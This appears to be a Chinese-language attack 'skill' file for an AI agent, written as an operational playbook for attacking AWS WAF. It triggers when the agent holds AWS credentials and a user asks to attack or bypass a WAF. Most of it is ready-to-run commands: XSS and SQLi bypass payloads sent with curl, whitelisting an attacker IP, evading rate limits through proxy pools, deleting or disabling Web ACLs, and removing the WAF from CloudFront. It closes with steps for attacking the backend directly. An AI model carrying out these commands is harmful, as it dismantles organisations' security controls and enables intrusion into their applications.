---
name: aws-waf-attack
type: attack
category: security
platform: aws
severity: medium
---

# AWS WAF 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 WAF
- 用户要求"攻击 WAF" 或"绕过 WAF"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有 Web ACL
aws waf-regional list-web-acls --region REGION

# 3. 获取 Web ACL 详情
aws waf-regional get-web-acl --web-acl-id WEB_ACL_ID --region REGION
```

## 攻击方法

### 方法 1: WAF 规则枚举

```bash
# 1. 列出所有 Web ACL
aws waf-regional list-web-acls --region REGION --query 'WebACLs[]' --output json

# 2. 获取 Web ACL 详情
aws waf-regional get-web-acl --web-acl-id WEB_ACL_ID --region REGION

# 3. 获取所有规则
aws waf-regional list-rules --region REGION

# 4. 获取规则详情
aws waf-regional get-rule --rule-id RULE_ID --region REGION
```

### 方法 2: WAF 绕过

```bash
# 1. 检查 WAF 配置
aws waf-regional get-web-acl --web-acl-id WEB_ACL_ID --region REGION | \
  jq -r '.WebACL.Rules[]'

# 2. 查找规则中的漏洞
# - 正则表达式绕过
# - 大小写绕过
# - 编码绕过

# 3. 测试常见绕过
curl -X POST https://TARGET_URL \
  -H "User-Agent: AttackerBot" \
  -d '{"malicious": "<script>alert(1)</script>"}'

# 4. 使用大小写绕过
curl -X POST https://TARGET_URL \
  -d '{"malicious": "<ScRiPt>aLeRt(1)</sCrIpT>"}'
```

### 方法 3: IP 白名单利用

```bash
# 1. 获取 IP Set
aws waf-regional list-ip-sets --region REGION

# 2. 创建恶意 IP Set
aws waf-regional create-ip-set \
  --name attacker-ips \
  --region REGION

# 3. 添加攻击者 IP 到 IP Set
IP_SET_ID=$(aws waf-regional create-ip-set ... --query 'IPSet.IPSetId' --output text)
aws waf-regional update-ip-set \
  --ip-set-id $IP_SET_ID \
  --region REGION \
  --updates "Action=INSERT,IpSetDescriptor={Type=IPV4,Value=ATTACKER_IP/32}"

# 4. 创建白名单规则
aws waf-regional create-rule \
  --name whitelist-rule \
  --metric-name whitelist-rule \
  --region REGION \
  --conditions "Field=REMOTE_ADDR,Source=IPSet,SourceIdentifier=$IP_SET_ID"
```

### 方法 4: Rate Limit 绕过

```bash
# 1. 检查 Rate Limit 配置
aws waf-regional get-web-acl ... | jq -r '.WebACL.Rules[] | select(.Name | contains("rate"))'

# 2. 如果有 Rate Limit
# 使用多个 IP 地址绕过
for ip in $IP_LIST; do
  curl -X POST https://TARGET_URL --interface $ip --data "attack"
done

# 3. 或使用代理池
for proxy in $(cat proxies.txt); do
  curl -X POST https://TARGET_URL --proxy $proxy --data "attack"
done

# 4. 分布式攻击（使用多个源）
```

### 方法 5: XSS 和 SQLi 绕过

```bash
# 1. 测试 XSS 绕过
# 常见绕过技术
curl -X POST https://TARGET_URL \
  -d '<img src=x onerror=alert(1)>'

curl -X POST https://TARGET_URL \
  -d '<svg onload=alert(1)>'

# 2. 测试 SQLi 绕过
curl -X POST https://TARGET_URL \
  -d "1' OR '1'='1"

curl -X POST https://TARGET_URL \
  -d "1' UNION SELECT NULL,NULL,NULL--"

# 3. 使用编码绕过
# URL 编码
curl -X POST https://TARGET_URL \
  -d "<script%3ealert(1)%3c/script%3e"

# 4. Unicode 编码
curl -X POST https://TARGET_URL \
  -d "<script>alert(1)</script>"
```

### 方法 6: WAF 禁用和修改

```bash
# 1. 删除 Web ACL（如果有权限）
aws waf-regional delete-web-acl --web-acl-id WEB_ACL_ID --region REGION

# 2. 更新 Web ACL（移除规则）
aws waf-regional update-web-acl \
  --web-acl-id WEB_ACL_ID \
  --region REGION \
  --updates "Action=DELETE,ActivatedRule=Priority=1"

# 3. 禁用所有规则
aws waf-regional update-web-acl \
  --web-acl-id WEB_ACL_ID \
  --region REGION \
  --default-action Type=ALLOW

# 4. 创建空 Web ACL
aws waf-regional create-web-acl \
  --name empty-waf \
  --metric-name empty-waf \
  --region REGION \
  --default-action Type=ALLOW
```

### 方法 7: WAF 日志利用

```bash
# 1. 检查是否启用日志
aws waf-regional get-logging-configuration \
  --resource-arn WEB_ACL_ARN \
  --region REGION

# 2. 如果启用了 CloudWatch Logs
# 访问日志
aws logs get-log-events \
  --log-group-name /aws/waf/WEB_ACL_NAME \
  --log-stream-name LOG_STREAM_NAME

# 3. 搜索 WAF 绕过尝试
aws logs filter-log-events \
  --log-group-name /aws/waf/WEB_ACL_NAME \
  --filter-pattern "BLOCKED|ALLOWED|excluded"

# 4. 分析被拦截的请求
# 识别绕过方法
```

### 方法 8: Managed Rules 利用

```bash
# 1. 列出托管规则组
aws waf-regional list-available-managed-rule-groups --region REGION

# 2. 获取托管规则组详情
aws waf-regional get-managed-rule-group \
  --name RULE_GROUP_NAME \
  --scope REGIONAL \
  --region REGION

# 3. 检查哪些规则被禁用
# 可能存在配置错误

# 4. 利用规则覆盖
# 如果管理员覆盖了某些规则
```

### 方法 9: Bot 绕过

```bash
# 1. 检查 Bot 配置
aws waf-regional get-web-acl ... | jq -r '.WebACL.Rules[] | select(.Name | contains("bot"))'

# 2. 如果启用了 Bot 保护
# 伪装成合法 Bot
curl -X POST https://TARGET_URL \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

# 3. 或使用常见的 User-Agent
curl -X POST https://TARGET_URL \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 4. 使用 Headless 浏览器
# 绕过 Bot 检测
```

### 方法 10: CloudFront 集成利用

```bash
# 1. 检查 CloudFront 集成
aws cloudfront list-distributions | \
  jq -r '.DistributionList.Items[] | select(.DefaultCacheBehavior.WebACLId=="WEB_ACL_ID")'

# 2. 获取 Distribution 配置
aws cloudfront get-distribution --id DISTRIBUTION_ID

# 3. 修改 Distribution（移除 WAF）
aws cloudfront get-distribution-config --id DISTRIBUTION_ID > dist-config.json
jq '.DefaultCacheBehavior.WebACLId = null' dist-config.json > new-config.json
aws cloudfront update-distribution \
  --id DISTRIBUTION_ID \
  --distribution-config file://new-config.json \
  --if-match ETag

# 4. 或创建新的 Distribution（绕过 WAF）
aws cloudfront create-distribution \
  --distribution-config file://malicious-config.json
```

## 验证成功

```bash
# 成功列出 Web ACL
aws waf-regional list-web-acls --region REGION

# 成功获取规则
aws waf-regional get-web-acl --web-acl-id WEB_ACL_ID --region REGION

# 成功绕过 WAF
curl -X POST https://TARGET_URL --data "malicious_payload"
```

## 下一步

1. 分析 WAF 规则找出绕过方法
2. 通过 WAF 禁用直接攻击后端
3. 利用 WAF 日志了解安全策略
4. 结合其他 AWS 服务进行复合攻击
